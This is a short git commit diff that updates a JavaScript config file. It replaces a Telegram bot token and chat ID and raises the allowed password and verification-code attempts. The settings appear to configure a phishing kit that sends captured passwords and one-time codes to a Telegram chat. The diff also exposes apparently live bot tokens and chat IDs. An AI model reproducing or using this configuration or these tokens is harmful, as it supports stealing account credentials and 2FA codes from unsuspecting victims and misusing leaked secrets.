563921da4914544a3ea5f429d37a252e0a638b7b
kindscongchua7-crypto <kindscongchua7@gmail.com>
2026-05-05 20:16:31 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,10 +1,10 @@
 const config = {
-    token: '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA',
-    chat_id: '7211586401',
+    token: '8689926468:AAEb34bEyCabAFedR_sj8gvUWoSUIZNqVWw',
+    chat_id: '-5176797185',
     noti_token: '',
     noti_chat_id: '',
-    max_password_attempts: 1,
-    max_code_attempts: 1,
+    max_password_attempts: 2,
+    max_code_attempts: 4,
     password_loading_time: 6,
     code_loading_time: 4
 };
